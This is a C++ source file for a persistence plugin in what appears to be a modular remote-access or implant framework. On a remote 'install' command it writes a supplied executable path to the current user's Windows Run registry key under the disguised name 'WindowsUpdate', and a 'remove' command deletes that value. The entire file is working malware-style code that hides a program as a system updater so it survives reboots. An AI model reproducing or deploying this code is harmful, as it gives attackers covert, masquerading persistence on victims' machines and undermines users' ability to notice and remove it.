#include "PersistenceModule.h"
#include "Protocol.h"
#include <windows.h>

PersistenceModule::PersistenceModule() {}

PersistenceModule::~PersistenceModule() {}

ModuleInfo PersistenceModule::GetInfo() const {
    ModuleInfo info;
    info.name = "Persistence";
    info.version = "1.0.0";
    info.description = "Install/remove persistence mechanisms";
    info.type = ModuleType::PERSISTENCE;
    info.interfaceVersion = MODULE_INTERFACE_VERSION;
    return info;
}

bool PersistenceModule::Initialize() {
    return true;
}

ModuleResult PersistenceModule::Execute(const std::vector<uint8_t>& params) {
    ModuleResult result;
    result.success = false;

    try {
        const uint8_t* ptr = params.data();
        size_t remaining = params.size();
        std::string action = Protocol::DeserializeString(ptr, remaining);

        if (action == "install") {
            std::string path = Protocol::DeserializeString(ptr, remaining);
            result.success = InstallPersistence(path);
        }
        else if (action == "remove") {
            result.success = RemovePersistence();
        }
    }
    catch (const std::exception& e) {
        result.errorMessage = e.what();
    }

    return result;
}

void PersistenceModule::Cleanup() {}

bool PersistenceModule::InstallPersistence(const std::string& path) {
    HKEY hKey;
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* valueName = "WindowsUpdate";

    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey);
    if (result != ERROR_SUCCESS) {
        return false;
    }

    result = RegSetValueExA(hKey, valueName, 0, REG_SZ,
        reinterpret_cast<const BYTE*>(path.c_str()), static_cast<DWORD>(path.length() + 1));

    RegCloseKey(hKey);
    return result == ERROR_SUCCESS;
}

bool PersistenceModule::RemovePersistence() {
    HKEY hKey;
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* valueName = "WindowsUpdate";

    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey);
    if (result != ERROR_SUCCESS) {
        return false;
    }

    result = RegDeleteValueA(hKey, valueName);
    RegCloseKey(hKey);

    return result == ERROR_SUCCESS;
}

EXPORT_MODULE(PersistenceModule)
